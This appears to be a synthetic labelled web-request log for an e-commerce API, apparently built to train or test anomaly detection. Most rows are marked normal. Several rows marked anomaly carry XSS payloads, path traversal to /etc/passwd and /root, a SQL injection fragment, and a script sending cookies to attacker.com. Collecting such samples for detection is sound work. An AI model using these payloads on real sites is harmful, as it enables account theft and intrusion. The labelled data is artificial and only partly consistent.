+2023/7/19 14:35,  /invoices, POST,200,340,normal
+2023/7/19 14:11,  /addresses, POST,200,521,normal
+2023/7/19 13:45,  /admin/products?limit=10&page=1, GET,200,520,normal
+2023/7/19 14:20,  /afterSaleServices, POST,200,343,normal
+2023/7/19 14:08,  /paymentMethod/payment123, DELETE,200,834,normal
+2023/7/19 14:45,  /account, PUT,302,279,normal
+2023/7/19 14:01,  /afterSaleService/service9876, DELETE,200,927,normal
+2023/7/19 13:57,  /addresses/20, POST,200,346,normal
+2023/7/19 14:48,  /user/newsletter, POST,200,288,normal
+2023/7/19 14:02,/admin/afterSaleServices/service123?title=<script>evilFunction()</script>,PUT,200,984,anomaly
+2023/7/19 13:58,  /users, POST,200,567,normal
+2023/7/19 14:17,  /users/user987, DELETE,403,431,normal
+2023/7/19 13:55,  /gift_certificate, POST,200,789,normal
+2023/7/19 13:56,  /orders?userId=745, GET,200,239,normal
+2023/7/19 14:02,/shareRules/456,PUT,302,463,anomaly
+2023/7/19 13:51,  /items/678, GET,200,466,normal
+2023/7/19 14:02,/shareRules/789,PUT,302,179,anomaly
+2023/7/19 14:45,"/shareRules?name=<img src=\""x\"" onerror=\""alert('XSS Attack!')\"">",POST,200,500,anomaly
+2023/7/19 13:51,  /products?category=321&active=true&page=3&limit=15, GET,200,323,normal
+2023/7/19 14:45,/beSharedItems?q=<script>maliciousFunction()</script>,POST,201,450,anomaly
+2023/7/19 14:25,  /items?category=Clothing&page=2, GET,200,462,normal
+2023/7/19 13:51,  /reward, POST,201,350,normal
+2023/7/19 14:45,  users/login, POST,200,140,normal
+2023/7/19 14:25,  /shoppingCart/items/17, DELETE,200,329,normal
+2023/7/19 13:55,  /products/product102, GET,200,589,normal
+2023/7/19 14:12,/collections,POST,200,4951,anomaly
+2023/7/19 13:55,  /order/abc123, POST,200,436,normal
+2023/7/19 14:05,  /admin/register, POST,200,437,normal
+2023/7/19 13:51,  /billingAddress/556, PUT,200,450,normal
+2023/7/19 13:57,  /shipping/costs?addressId=1, GET,200,513,normal
+2023/7/19 14:31,  /orders/7, PUT,200,836,normal
+2023/7/19 14:02,  /collections?page=1&limit=10, GET,200,500,normal
+2023/7/19 14:02,  /items/gadget789, GET,200,500,normal
+2023/7/19 14:48,  /orders/order987, DELETE,100,651,normal
+2023/7/19 14:46,  /addresses, POST,200,899,normal
+2023/7/19 14:36,  /product/635/comments?page=1&limit=15, GET,200,579,normal
+2023/7/19 13:51,  /customers/897, PUT,200,252,normal
+2023/7/19 14:40,  /addToCart, POST,200,677,normal
+2023/7/19 14:48,  /cartItems, POST,200,674,normal
+2023/7/19 13:51,  /addresses/123, DELETE,200,667,normal
+2023/7/19 13:59,  /reports?page=2&limit=15, GET,200,231,normal
+2023/7/19 13:49,  /users/profile/update, PUT,302,190,normal
+2023/7/19 14:28,  /login, POST,200,228,normal
+2023/7/19 14:11,  /products/123, POST,201,710,normal
+2023/7/19 14:04,  /user/123, DELETE,200,171,normal
+2023/7/19 14:30,  /sales, POST,201,932,normal
+2023/7/19 14:02,  /inventory/clothing, GET,205,653,normal
+2023/7/19 13:51,  /createUser, POST,200,487,normal
+2023/7/19 13:46, /customerDetails/user456, GET,200,533,normal
+2023/7/19 13:46,/afterSaleServices/service123/../../../sys_log/,GET,200,921,anomaly
+2023/7/19 14:35,  /redeem, POST,201,608,normal
+2023/7/19 14:02,  /afterSaleServices/service456, PUT,201,538,normal
+2023/7/19 13:58,  /meal, POST,201,458,normal
+2023/7/19 14:01,  /cart/8, GET,200,367,normal
+2023/7/19 13:51,  /afterSaleServices/service987, DELETE,200,996,normal
+2023/7/19 14:22,  /product/452/variations, GET,200,560,normal
+2023/7/19 13:51,  /orders/automaticExports, GET,200,540,normal
+2023/7/19 14:15,  /resetpassword/abc123, PUT,200,970,normal
+2023/7/19 13:51,  /products/list?category=Electronics&page=2&limit=10, GET,200,398,normal
+2023/7/19 14:22,/admin/afterSaleServices/234,GET,302,2905,anomaly
+2023/7/19 13:55,  /admin/users/user123, DELETE,400,146,normal
+2023/7/19 14:45,/comments/def456/../../../sys_log,DELETE,200,590,anomaly
+2023/7/19 13:45,  /user/login, POST,200,136,normal
+2023/7/19 14:49,  /collections/item456, PUT,200,541,normal
+2023/7/19 14:13,/afterSaleServices?page=3&limit=5,GET,200,638,anomaly
+2023/7/18 14:57,  /cart, POST,200,550,normal
+2023/7/18 14:57,  /promotions/code456, GET,200,394,normal
+2023/7/19 14:44,  /customers/456/purchases, GET,200,554,normal
+2023/7/19 14:32,  /members, POST,201,500,normal
+2023/7/19 14:17,  /users/456, PUT,202,133,normal
+2023/7/19 14:28,/admin/afterSaleServices/234,PUT,302,8081,anomaly
+2023/7/19 13:58,  /cart/6544, PUT,200,465,normal
+2023/7/19 14:02,/afterSaleServices?page=2&limit=15,GET,200,621,anomaly
+2023/7/19 14:33,/afterSaleServices?page=1&limit=12,GET,302,6944,anomaly
+2023/7/19 14:39,  /applications/12345, DELETE,202,123,normal
+2023/7/18 12:03,  /collections, POST,201,765,normal
+2023/7/19 14:01,  /coupons/?expired=yes, GET,200,630,normal
+2023/7/19 14:22,  /addresses/3, DELETE,202,150,normal
+2023/7/19 14:25,/admin/afterSaleServices/567,GET,200,3267,anomaly
+2023/7/19 14:34,  /posts/123, DELETE,302,575,normal
+2023/7/19 13:50,  /users/12345, GET,200,627,normal
+2023/7/19 14:11,  /products/xyz123, DELETE,302,395,normal
+2023/7/19 14:01,  /shippingAddresses?userId=456&page=1&limit=10, GET,303,432,normal
+2023/7/19 13:51,  /customers/123, GET,307,914,normal
+2023/7/18 14:57,/addresses?page=1&limit=10,GET,302,192,anomaly
+2023/7/19 14:10,  /customers/566, GET,200,559,normal
+2023/7/19 14:45,  /user/123, POST,200,200,normal
+2023/7/19 14:30,  /admin/reviews/review789, DELETE,200,973,normal
+2023/7/19 13:51,  /contactus, POST,200,552,normal
+2023/7/19 13:51,  /items, GET,200,223,normal
+2023/7/19 13:51,  /updateProduct/item101, PUT,200,220,normal
+2023/7/19 14:42,  /items, POST,201,937,normal
+2023/7/19 14:14,  /products/category/567, DELETE,301,887,normal
+2023/7/19 14:15,  /cart/status?userId=134, GET,200,302,normal
+2023/7/19 14:41,  /admin/afterSaleServices/789, PUT,200,383,normal
+2023/7/19 13:46,  /admin/comments/gsr876, PUT,200,501,normal
+2023/7/19 13:55,  /admin/users, POST,201,274,normal
+2023/7/19 14:31,  /catalog, GET,200,550,normal
+2023/7/19 13:55,  /cart/cart567, DELETE,200,291,normal
+2023/7/19 13:59,  /admin/afterSaleServices?userId=789, GET,200,753,normal
+2023/7/19 14:06,  /applycoupon, POST,200,400,normal
+2023/7/19 14:48,  /discounts/user?userId=14M, GET,200,109,normal
+2023/7/19 14:51,  /users, POST,201,920,normal
+2023/7/19 14:19,/admin/afterSaleServices?userId=567&page=2&limit=10,GET,200,1500,anomaly
+2023/7/19 14:34,  /products/prod789, GET,200,507,normal
+2023/7/19 14:44,  /cart/item123, PUT,200,728,normal
+2023/7/19 14:07,  /addresses, POST,201,237,normal
+2023/7/19 14:02,  /customer, POST,201,407,normal
+2023/7/19 13:58,  /order/456, DELETE,202,419,normal
+2023/7/19 14:01,  /events?date=today, GET,200,225,normal
+2023/7/19 14:42,  /promoCode, POST,201,450,normal
+2023/7/19 14:45,  /products?userId=456&page=4&limit=10, GET,200,90,normal
+2023/7/19 14:11,  /goods/789/ratings?sort=asc, GET,302,72,normal
+2023/7/19 14:00,  /returnProducts/user155, PUT,200,219,normal
+2023/7/19 13:51,  /userDetails/user456, POST,202,268,normal
+2023/7/19 14:40,  /discount, GET,200,993,normal
+2023/7/19 14:07,  /cart/2, PUT,400,420,normal
+2023/7/19 13:52,  /checkout/order321, PUT,200,637,normal
+2023/7/19 14:15,  /addresses/15, GET,302,96,normal
+2023/7/19 14:13,/collections/123,DELETE,200,5078,anomaly
+2023/7/19 14:13,  /rebate, GET,200,788,normal
+2023/7/19 13:57,  /orders/order135, PUT,200,750,normal
+2023/7/19 14:27,  /product/123/reviews, POST,200,742,normal
+2023/7/19 14:46,  /account/999, PUT,200,492,normal
+2023/7/19 13:58,  /locations, POST,200,763,normal
+2023/7/19 14:40,  /promotions, POST,302,856,normal
+2023/7/19 13:51,  /admin/orders/rst890, PUT,200,278,normal
+2023/7/19 14:02,  /admin/shipping/123, PUT,400,854,normal
+2023/7/19 13:55,  /products/item111, DELETE,200,585,normal
+2023/7/19 13:57,  /products/403, PUT,302,122,normal
+2023/7/19 14:27,/admin/afterSaleServices/123,PUT,302,5370,anomaly
+2023/7/19 13:54,  /promotions, POST,201,645,normal
+2023/7/19 14:37,  /products/shampoo, POST,200,559,normal
+2023/7/19 14:45,  /accounts/user789, PUT,202,998,normal
+2023/7/19 14:11,  /categories, PUT,200,523,normal
+2023/7/19 14:11,  /orderHistories, POST,201,922,normal
+2023/7/19 14:45,  /products, POST,201,654,normal
+2023/7/19 13:59,  /shareRules, POST,201,559,normal
+2023/7/19 14:28,  /customers, POST,201,827,normal
+2023/7/19 13:48,  /metadata/users, GET,200,211,normal
+2023/7/19 14:09,/collections?page=1&limit=10,GET,200,276,anomaly
+2023/7/19 13:51,  /checkout, POST,200,653,normal
+2023/7/19 14:25,"/shareRules?name=<img src=\""x\"" onerror=\""alert('XSS Attack!')\"">",POST,201,500,anomaly
+2023/7/19 13:58,  /addDiscount, PUT,200,325,normal
+2023/7/19 14:35,  /items/item789, PUT,400,250,normal
+2023/7/19 13:51,  /orders/456, PUT,200,423,normal
+2023/7/19 13:56,  /products?page=1&limit=10, GET,200,899,normal
+2023/7/19 13:51,  /customer/profile/654, GET,200,489,normal
+2023/7/19 13:47,  /users/user123/orders, POST,200,466,normal
+2023/7/19 14:40,  /orders/user123, GET,200,999,normal
+2023/7/19 14:01,  /catalog/products/4, PUT,301,300,normal
+2023/7/19 13:51,  /shipments/shipment378, GET,200,534,normal
+2023/7/19 14:25,  /admin/comments?commentId=rst456, PUT,200,280,normal
+2023/7/19 14:35,  /payment, PUT,200,240,normal
+2023/7/19 13:59,  /orders/order789, DELETE,200,345,normal
+2023/7/19 13:59,  /payments, POST,200,234,normal
+2023/7/19 13:46,/adminInfo?page=2&limit=15,GET,200,962,anomaly
+2023/7/19 14:38,  /users, POST,200,220,normal
+2023/7/19 14:22,  /discountRules?page=3&limit=10, GET,200,742,normal
+2023/7/19 13:51,  /delivery/order235, GET,200,931,normal
+2023/7/19 14:45,  /inventory/232, PUT,201,371,normal
+2023/7/19 13:51,  /shareRules/rule789, DELETE,204,401,normal
+2023/7/19 14:14,  /products/store123, GET,200,286,normal
+2023/7/19 13:51,  /cart/items/321, DELETE,200,400,normal
+2023/7/19 13:47,  usersuser1001newsletter, POST,200,140,normal
+2023/7/19 14:46,  /order/order9876, POST,201,762,normal
+2023/7/19 13:55,  /accounts/user789, PUT,200,421,normal
+2023/7/19 14:15,  /shipments/shipment111, GET,200,765,normal
+2023/7/19 13:55,  /updateWishlist, PUT,200,412,normal
+2023/7/19 14:31,/addresses?page=1&limit=10,GET,200,620,anomaly
+2023/7/19 14:14,/collections/345,DELETE,200,4155,anomaly
+2023/7/19 14:17,/product/789/comments,POST,302,400,anomaly
+2023/7/19 13:48,  /users/890, GET,403,512,normal
+2023/7/19 14:29,  /products/g123, GET,200,280,normal
+2023/7/19 14:24,  /comments/def456, DELETE,200,404,normal
+2023/7/19 13:51,  /orders, POST,200,780,normal
+2023/7/19 14:46,  /addresses, PUT,200,890,normal
+2023/7/19 14:36,  /discountCode/code123, GET,200,319,normal
+2023/7/19 14:45,/addresses?page=1&limit=10,GET,200,620,anomaly
+2023/7/19 14:44,  /wishlist/xyz789, DELETE,200,504,normal
+2023/7/19 13:51,  /products, POST,201,329,normal
+2023/7/19 14:15,  /products/111, GET,200,481,normal
+2023/7/19 14:17,  /countries, GET,200,456,normal
+2023/7/19 14:45,  /cart/123, GET,200,223,normal
+2023/7/19 13:57,  /products/012/reviews, GET,200,803,normal
+2023/7/19 14:09,  /cart/item987, PUT,201,578,normal
+2023/7/19 14:31,/afterSaleServices?page=1&limit=10,GET,200,6253,anomaly
+2023/7/19 14:11,  /inventory/items, POST,200,650,normal
+2023/7/19 14:02,  /purchases/user456, POST,201,223,normal
+2023/7/19 13:51,  /deleteAccount, DELETE,201,580,normal
+2023/7/18 13:45,  /tasks/987, DELETE,204,244,normal
+2023/7/19 14:15,  /beSharedVideos, POST,401,425,normal
+2023/7/19 14:11,  /order/abc123, DELETE,200,577,normal
+2023/7/19 14:15,/afterSaleServices/../../root/,POST,200,697,anomaly
+2023/7/19 14:30,/admin/afterSaleServices/456,PUT,200,6604,anomaly
+2023/7/19 13:51,  /orders/checkout, POST,201,672,normal
+2023/7/19 13:53,  /wishlist?userId=789, POST,200,510,normal
+2023/7/19 14:04,  /products, POST,201,322,normal
+2023/7/19 13:55,  /payments/receipt456, GET,200,703,normal
+2023/7/19 14:51,  /products/1008, PUT,200,779,normal
+2023/7/19 14:13,  /admin/orderInfo?userId=892, GET,200,218,normal
+2023/7/19 14:11,  /reviews/, POST,200,305,normal
+2023/7/19 13:55,  /payments/payment456, GET,200,333,normal
+2023/7/19 14:02,  /orders/284, GET,200,375,normal
+2023/7/19 14:02,/admin/afterSaleServices/service101?title=<script>evilFunction()</script>,GET,200,673,anomaly
+2023/7/19 13:59,  /login, POST,200,400,normal
+2023/7/18 14:57,  /customers/456/shippingInfo, PUT,200,624,normal
+2023/7/19 14:02,  /products/266, GET,200,179,normal
+2023/7/19 14:45,/shareRules/rule123?q=<script>maliciousFunction()</script>,DELETE,204,510,anomaly
+2023/7/19 14:17,  /carts/cart123, POST,100,675,normal
+2023/7/19 13:59,  /userNotifications/30, PUT,200,578,normal
+2023/7/19 13:55,  /profile?userId=456, GET,200,714,normal
+2023/7/19 13:54,  /users/user789, GET,200,951,normal
+2023/7/19 14:45,  /customer/12345, GET,200,500,normal
+2023/7/19 14:31,  products/product567, PUT,200,356,normal
+2023/7/19 14:36,/afterSaleServices/234, PUT,200,7567,anomaly
+2023/7/19 14:13,  /cartItems/919, PUT,200,652,normal
+2023/7/19 13:59,  /orders, POST,200,666,normal
+2023/7/19 14:19,"/admin/afterSaleServices/service456?query=<script>alert(""XSS"")</script>",PUT,200,872,anomaly
+2023/7/19 14:02,  /products, POST,201,373,normal
+2023/7/19 13:47,  /collections/item120, POST,301,625,normal
+2023/7/19 14:01,  /checkOut, GET,200,531,normal
+2023/7/19 13:46,/sysManager/shareRules,POST,200,500,anomaly
+2023/7/19 14:48,  /orders/123, DELETE,200,400,normal
+2023/7/19 14:46,  /addresses/987, DELETE,202,711,normal
+2023/7/18 13:45,  /updateShipping, POST,200,209,normal
+2023/7/19 14:01,usersuser789favorites,POST,200,370,anomaly
+2023/7/19 14:32,  /order/aei321, PUT,200,732,normal
+2023/7/19 13:51,/shareRules/rule789/../../../etc/passwd,DELETE,204,430,anomaly
+2023/7/19 14:17,  usersuser456likes, GET,200,710,normal
+2023/7/19 14:02,  /cart/item987, PUT,200,650,normal
+2023/7/19 14:15,  /products?category=books&limit=25, HEAD,200,763,normal
+2023/7/19 13:57,  /checkout, POST,200,562,normal
+2023/7/19 14:37,  /admin/afterSaleServices/567, PUT,200,4110,normal
+2023/7/19 14:13,/afterSaleServices/../../etc/passwd,POST,200,541,anomaly
+2023/7/19 14:02,  /buyNowItems, POST,302,659,normal
+2023/7/19 14:25,  /products/102, POST,204,310,normal
+2023/7/19 14:40,  /user/orders, POST,201,800,normal
+2023/7/19 13:59,  /admin/afterSaleServices/service234, DELETE,200,643,normal
+2023/7/19 14:49,  /products/update/xyz789, PUT,200,350,normal
+2023/7/19 13:46,  /products?category=clothing, GET,200,117,normal
+2023/7/19 13:47,  /addtoWishList, POST,201,660,normal
+2023/7/19 13:51,  /messages?page=2&limit=25, GET,200,701,normal
+2023/7/19 13:51,  /collections/product456, DELETE,200,117,normal
+2023/7/19 13:55,  /downgrade, DELETE,204,152,normal
+2023/7/19 13:55,  /accounts/user987, GET,200,502,normal
+2023/7/19 14:45,  /carts/982, POST,200,214,normal
+2023/7/19 14:49,  /shipping/address?zipcode=90210, GET,200,174,normal
+2023/7/19 13:46,  /products/product444, PUT,200,643,normal
+2023/7/19 14:11,  /orders, POST,201,911,normal
+2023/7/19 13:46,  /beSharedItems, POST,201,800,normal
+2023/7/19 14:48,  /carts/items, PUT,200,64,normal
+2023/7/19 14:01,/admin/afterSaleServices/service123?sort_by=%3Cscript%3Ealert('XSS')%3C/script%3E,GET,200,777,anomaly
+2023/7/19 14:11,"/goods/789/shareRules?name=<img src=\""x\"" onerror=\""alert('XSS Attack!')\"">",GET,200,590,anomaly
+2023/7/19 13:55,  /orders, POST,201,799,normal
+2023/7/19 13:51, /collections?page=3&limit=5%20OR%20'x'='x',GET,200,560,anomaly
+2023/7/19 13:59,  /auth/login, POST,201,108,normal
+2023/7/19 14:25,  /order/place, POST,200,844,normal
+2023/7/19 14:17,  /rateProduct/678, DELETE,302,32,normal
+2023/7/19 14:17,  /messages, POST,200,366,normal
+2023/7/19 13:50,  /orders/item135, PUT,200,871,normal
+2023/7/19 14:15,/collections/456,DELETE,302,1500,anomaly
+2023/7/19 13:49,  /reviews?productId=321, GET,200,338,normal
+2023/7/19 14:47,/products/3321/../../../../root/,GET,200,710,anomaly
+2023/7/19 14:11,  /users/, POST,200,249,normal
+2023/7/19 14:00,  /inventory/product567, POST,302,457,normal
+2023/7/19 14:45,  /afterSaleServices, POST,201,493,normal
+2023/7/19 13:46,/afterSaleServices/service101/../../../etc/passwd,GET,200,547,anomaly
+2023/7/19 13:46,  /inventory, GET,200,1104,normal
+2023/7/19 14:01,  /afterSaleServices/service987, PUT,200,511,normal
+2023/7/19 13:46,  /collections/item123, DELETE,200,280,normal
+2023/7/19 14:02,  /cart/345, PUT,200,452,normal
+2023/7/19 14:40,  /items, GET,200,819,normal
+2023/7/19 13:55,  /items, POST,201,620,normal
+2023/7/19 13:51,  /order/567, GET,200,234,normal
+2023/7/19 14:38,/afterSaleServices/456,PUT,200,4320,anomaly
+2023/7/19 14:27,  /products, POST,201,999,normal
+2023/7/19 14:19,/collections/item123?input=<script>document.location='http://attacker.com?data='+document.cookie</script>,DELETE,200,890,anomaly
+2023/7/19 13:47,  /admin/orders/order123, PUT,201,879,normal
+2023/7/19 14:20,  /cart, POST,201,303,normal
+2023/7/19 13:55,  /carts, POST,301,410,normal
+2023/7/19 14:48,  /carts/items/ABXY123, DELETE,200,900,normal
+2023/7/19 13:55,  /inventory/update, POST,200,112,normal
+2023/7/19 13:55,  /products?sortBy=price&limit=10, GET,200,305,normal
+2023/7/19 14:46,  /shareRules, POST,201,559,normal
+2023/7/19 14:07,  /admin/payment/payment1223, POST,200,532,normal
+2023/7/19 14:11,  /cartitems/123, PUT,200,478,normal
+2023/7/19 14:46,  /login, POST,201,830,normal
+2023/7/19 13:59,  /addresses/527, DELETE,200,483,normal
+2023/7/19 14:45,  /loyaltyRewards?page=4&limit=7, POST,200,833,normal
+2023/7/19 14:02,  /product/255/ratings, POST,302,918,normal
+2023/7/19 14:01,  /shops/456, POST,200,189,normal
+2023/7/19 14:40,  /login, POST,307,323,normal
+2023/7/19 14:11,  /products/123, GET,200,232,normal
+2023/7/19 13:55,  /addresses/12, DELETE,200,410,normal
+2023/7/19 13:55,/addresses,POST,200,300,anomaly
+2023/7/19 14:39,  /products/67890, PUT,200,746,normal
+2023/7/19 13:50,  /projects, POST,200,629,normal
+2023/7/19 14:29,  /catalog/item101, GET,200,376,normal
+2023/7/19 14:01,  /products, POST,200,297,normal
+2023/7/19 13:59,  /transactions?page=2&limit=10, GET,200,671,normal
+2023/7/19 14:48,  /admin/transactions/456, DELETE,200,510,normal
+2023/7/19 14:45,  /invoices?customerId=cust99, GET,200,328,normal
+2023/7/18 12:03,  /orders/123, PUT,201,999,normal
+2023/7/19 14:08,/rebate,GET,200,398,anomaly
+2023/7/19 13:53,  /collections, PUT,202,995,normal
+2023/7/19 14:23,/admin/afterSaleServices/345,GET,200,6500,anomaly
+2023/7/19 13:49,/addresses,POST,200,246,anomaly
+2023/7/19 13:47,  /customers/124, GET,200,634,normal
+2023/7/19 14:11,  /orders?page=1&limit=10, GET,200,200,normal
+2023/7/19 14:02,  /discount, GET,200,361,normal
+2023/7/19 14:14,  /users, POST,200,242,normal
+2023/7/19 13:49,  /admin/payments?page=3&limit=10, GET,200,701,normal
+2023/7/19 14:31,  /priceList/categoryItems, GET,200,576,normal
+2023/7/19 14:11,/collections?page=3&limit=20,GET,302,377,anomaly
+2023/7/19 14:04,/beSharedItems,POST,200,284,anomaly
+2023/7/19 13:45,  /accounts/12345, PUT,201,280,normal
+2023/7/19 14:52,  /order, DELETE,200,590,normal
+2023/7/19 14:04,  /orders/received?userId=456, GET,200,723,normal
+2023/7/19 14:02,  /addresses/456, PUT,200,405,normal
+2023/7/19 13:51,  /payment/transactions/1023, GET,200,439,normal
+2023/7/19 13:46,/afterSaleServices/service456/../../../sys_log/,GET,200,875,anomaly
+2023/7/19 13:51,  users/abc123, PUT,200,545,normal
+2023/7/19 14:04,  /customers?lastName=Smith, GET,200,149,normal
+2023/7/19 13:57,  /products/202/reviews?page=5&limit=9, GET,200,850,normal
+2023/7/19 14:04,  /order/items, POST,201,439,normal
+2023/7/19 14:39,  /shipping?page=4&limit=17, GET,200,106,normal
+2023/7/19 13:59,  /afterSaleServices/123, POST,201,819,normal
+2023/7/19 14:45,  /order_items, POST,200,290,normal
+2023/7/19 14:24,  /users/789/shippingAddress, POST,200,234,normal
+2023/7/19 14:07,/rebate,GET,200,186,anomaly
+2023/7/19 14:05,  /users/register, POST,201,743,normal
+2023/7/19 13:53,  /makePayment, POST,200,678,normal
+2023/7/19 13:52,  /categories/123, PUT,201,992,normal
+2023/7/19 14:34,  /transactions?userId=abc123, GET,200,400,normal
+2023/7/19 14:48,  /products, GET,203,412,normal
+2023/7/19 14:04,  /carts, PUT,201,659,normal
+2023/7/19 13:48,  /users/xyz123, PUT,200,231,normal
+2023/7/19 14:15,  /userAccounts/101, POST,200,445,normal
+2023/7/19 14:45,  /beSharedItems, POST,201,260,normal
+2023/7/19 13:59,"/goods/456/shareRules?name=<img src=\""x\"" onerror=\""alert('XSS Attack!')\"">",GET,200,400,anomaly
+2023/7/19 13:55,  /cart, POST,200,429,normal
+2023/7/19 14:17,  /user/123/contact-info, PUT,200,300,normal
+2023/7/19 14:33,  /products, POST,200,436,normal
+2023/7/19 14:46,  /items/list123, GET,200,1025,normal
+2023/7/19 14:31,  /track_order, POST,201,767,normal
+2023/7/19 13:51,  /addresses/xyz123, PUT,302,700,normal
+2023/7/19 14:31,  /cart/xyz, PUT,200,182,normal
+2023/7/19 14:46,  /users/profile, GET,200,326,normal
+2023/7/19 14:11,  /addresses/pqr111, PUT,200,500,normal
+2023/7/19 14:28,  /items, POST,200,925,normal
+2023/7/19 14:31,  /orders, POST,200,540,normal
+2023/7/19 14:29,/admin/afterSaleServices/345,PUT,200,8388,anomaly
+2023/7/19 13:51,  /permissions, PUT,200,190,normal
+2023/7/19 13:51,  /products/123, GET,200,509,normal
+2023/7/19 14:25,  /user/addresses, GET,200,217,normal
+2023/7/19 13:52,  /admin/users/user101, GET,200,769,normal
+2023/7/19 13:47,/addresses,POST,200,68,anomaly
+2023/7/19 13:55,  /settings/updateEmail, GET,200,238,normal
+2023/7/19 13:51,  /users?country=USA&page=2&limit=15, GET,200,624,normal
+2023/7/19 13:46,  /shippingRules/rule789, DELETE,204,598,normal
+2023/7/19 14:45,  /accessories/racks, OPTIONS,301,753,normal
+2023/7/19 13:56,  /accounts/ABC987, GET,200,567,normal
+2023/7/19 14:18,  forgotPassword, POST,200,411,normal
+2023/7/19 13:55,/goods/123/shareRules/../../../sys_log,GET,200,520,anomaly
+2023/7/19 14:45,  /orders, POST,200,491,normal
+2023/7/19 13:55,  /customer/profile/123, DELETE,202,200,normal
+2023/7/19 13:55,  /couponCodes, GET,200,172,normal
+2023/7/19 14:45,  /posts?page=1&limit=10, GET,200,963,normal
+2023/7/19 13:55,  /admin/reviews/qwe789, PUT,200,490,normal
+2023/7/19 14:17,/admin/afterSaleServices?userId=345&page=1&limit=12,GET,200,6500,anomaly
+2023/7/19 13:51,  /transactions/12345, POST,200,125,normal
+2023/7/19 14:45,  /messages, POST,200,562,normal
+2023/7/19 14:31,  /products, POST,201,351,normal
+2023/7/19 14:46,  /admin/users/userAB1, DELETE,302,400,normal
+2023/7/19 14:02,  /admin/orderHistory?userId=234, GET,200,370,normal
+2023/7/19 14:14,  /advertisers/99/promotions, POST,201,258,normal
+2023/7/19 14:11,  /products/890, POST,201,264,normal
+2023/7/19 13:55,  /collections/card/update, PUT,200,438,normal
+2023/7/19 14:29,  /users, POST,200,747,normal
+2023/7/19 14:17,  /greetingCards/create, POST,200,102,normal
+2023/7/19 13:59,  /api/shoppingcart, POST,201,435,normal
+2023/7/19 13:51,  /payments/validate, POST,200,965,normal
+2023/7/19 14:48,  /checkout, DELETE,200,978,normal
+2023/7/19 13:59,  /orders/947, PUT,200,931,normal
+2023/7/19 13:49,  /admin/categories, POST,200,425,normal
+2023/7/19 13:50,  /inventory/supplies, POST,200,223,normal
+2023/7/19 13:57,  /inventoryStocks, POST,201,701,normal
+2023/7/19 13:58,  /cart/123, POST,200,238,normal
+2023/7/19 14:02,  /cart/12345, DELETE,302,320,normal
+2023/7/19 14:01,  /product/123, PUT,200,420,normal
+2023/7/19 14:17,  /orders, PUT,200,421,normal
+2023/7/19 14:16,/admin/afterSaleServices?userId=123&page=1&limit=10,GET,200,1500,anomaly
+2023/7/19 14:13,  /coupons?amount=50, GET,200,830,normal
+2023/7/19 14:02,  /users/135, DELETE,200,699,normal
+2023/7/19 14:03,  /addresses, DELETE,204,452,normal
+2023/7/19 14:02,/afterSaleServices?page=3&limit=5,GET,200,752,anomaly
+2023/7/19 14:23,  /search, GET,200,955,normal
+2023/7/19 13:57,  /inventory, GET,200,915,normal
+2023/7/19 13:51,  /product/123/review, POST,302,794,normal
+2023/7/19 14:15,/afterSaleServices/../../root/,POST,200,431,anomaly
+2023/7/19 14:31,/admin/afterSaleServices/567,PUT,302,8345,anomaly
+2023/7/19 13:55,  /deals?page=2&limit=15, GET,200,900,normal
+2023/7/19 13:48,  /payments/confirm?orderId=12345, GET,200,430,normal
+2023/7/19 14:15,  /salesOffers, POST,201,202,normal
+2023/7/19 13:46,/adminInfo?page=1&limit=10,GET,200,751,anomaly
+2023/7/19 14:01,  /products/253/customerReviews?page=1&limit=10, GET,200,420,normal
+2023/7/19 14:31,  /orderHistory/item764, GET,200,789,normal
+2023/7/19 13:59,  /product/567, DELETE,204,408,normal
+2023/7/19 14:01,  /cart/123/items/456, PUT,200,604,normal
+2023/7/18 13:45,  /v1/orders/order789, PUT,200,234,normal
+2023/7/19 14:25,  /product/123/comment, POST,200,851,normal
+2023/7/19 14:45,  /afterSaleServices/service012, PUT,200,921,normal
+2023/7/19 14:46,  /inventory?itemId=item980, GET,200,453,normal
+2023/7/19 14:02,  /order/101/items?page=4&limit=5, GET,301,539,normal
+2023/7/19 14:17,  /purchases/856, POST,201,519,normal
+2023/7/19 14:17,  /finance/budget/abc569, PUT,200,612,normal
+2023/7/19 13:51,  /customerServiceTickets/ticket123, DELETE,204,478,normal
+2023/7/19 14:10,  /stores?city=Cityville, GET,200,222,normal
+2023/7/19 14:13,  /orders/order567, PUT,200,902,normal
+2023/7/19 13:45,/addresses?page=1&limit=10,GET,200,246,anomaly
+2023/7/19 14:19,"/collections?query=<script>alert(""XSS"")</script>",POST,201,340,anomaly
+2023/7/19 14:45,  /orders, POST,201,64,normal
+2023/7/19 14:25,  /afterSaleServices/service321, PUT,200,761,normal
+2023/7/19 13:55,/addresses?page=1&limit=10,GET,200,620,anomaly
+2023/7/18 13:46,  /accounts/12345, PUT,200,462,normal
+2023/7/19 14:17,  /orders, POST,200,914,normal
+2023/7/19 14:46,  /support/tickets, POST,200,326,normal
+2023/7/19 13:46,/afterSaleServices/service123/../../etc/hosts,GET,200,921,anomaly
+2023/7/19 14:34,  /product/item400, DELETE,200,919,normal
+2023/7/19 14:31,  /shippingSettings/setting123, DELETE,204,655,normal
+2023/7/19 13:51,  /products/1119, GET,200,977,normal
+2023/7/19 14:14,  /users/settings?userId=671&notification=true, GET,200,476,normal
+2023/7/19 13:55,  /products, POST,201,921,normal
+2023/7/19 13:53,  /cart/123, POST,202,607,normal
+2023/7/19 14:45,"/shareRules?name=<img src=\""x\"" onerror=\""alert('XSS Attack!')\"">",POST,201,539,anomaly
+2023/7/19 13:51,  /offers?page=1&limit=10, GET,200,570,normal
+2023/7/19 14:33,  /products/2, DELETE,302,279,normal
+2023/7/19 14:17,  /products/prod123, GET,200,920,normal
+2023/7/19 14:17,  /feedbacks, GET,200,111,normal
+2023/7/19 14:11,  /settings/32, GET,200,921,normal
+2023/7/19 14:02,  /departments/finance, PUT,200,713,normal
+2023/7/19 14:15,  //collections/item987, GET,204,482,normal
+2023/7/19 14:32,/afterSaleServices?page=2&limit=15,GET,200,9500,anomaly
+2023/7/19 14:01,  /products/348, GET,302,313,normal
+2023/7/19 14:51,  /products/pdt324, GET,200,205,normal
+2023/7/19 14:43,  /orderItems/item101, POST,200,791,normal
+2023/7/19 14:02,  /coupons, POST,201,228,normal
+2023/7/19 13:51,  /cart/update, PUT,200,551,normal
+2023/7/19 13:57,  /admin/discounts/45, DELETE,200,725,normal
+2023/7/19 14:02,/admin/afterSaleServices/service456?sort_by=%3Cscript%3Ealert('XSS')%3C/script%3E,GET,200,564,anomaly
+2023/7/19 14:45,  /accounts, POST,201,889,normal
+2023/7/19 13:53,  /inventory/item456, PUT,200,653,normal
